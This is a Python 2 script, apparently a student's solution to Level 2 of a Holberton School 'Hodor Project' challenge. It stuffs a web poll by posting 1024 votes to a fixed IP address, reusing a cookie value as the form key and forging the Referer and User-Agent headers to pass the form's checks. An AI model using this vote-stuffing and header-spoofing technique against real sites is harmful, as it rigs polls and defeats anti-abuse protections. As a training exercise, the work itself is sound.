"""
 *
 * ===---Description------------------------------------------------------------===
 *  Solution for the Hodor Project, Level 2 by Julien Barbier.
 *  Using Python script(httplib and urllib).
 *
 *  by Alexandro de Oliveira, for Holberton School
 * ===--------------------------------------------------------------------------===
 *
"""
from httplib import HTTPConnection
from urllib import urlencode

num_votes = 1 << 10 # Which means 1024 votes(bitwise operation " 1 << 10").
cookie = "c63e8f4583e0fc89436699268e402b6a441281c9"

params = urlencode({
    'id': '23',
    'holdthedoor': 'submit',
    'key': cookie,
    })

headers = {
    "Content-type": "application/x-www-form-urlencoded",
    "User-Agent": "Windows NT 100.0.0.0.1a (aka: Blue Screen of Death) Python Post Requests from anywhere- Alexandro de Oliveira",
    "Referer": "http://173.246.108.142/level2.php",
    "Cookie": "HoldTheDoor=" + cookie
    }

votes = 0
conn = HTTPConnection("173.246.108.142")
for x in range(0, num_votes):
    conn.request("POST", "/level2.php", params, headers)
    response = conn.getresponse()

    if response.reason == "OK":
        votes += 1
        print "Vote number: %d" % votes
    else:
        print "Connection error... (vote not computed)"
    #response.status, response.reason
    #data = response.read()
    #print data
    conn.close()
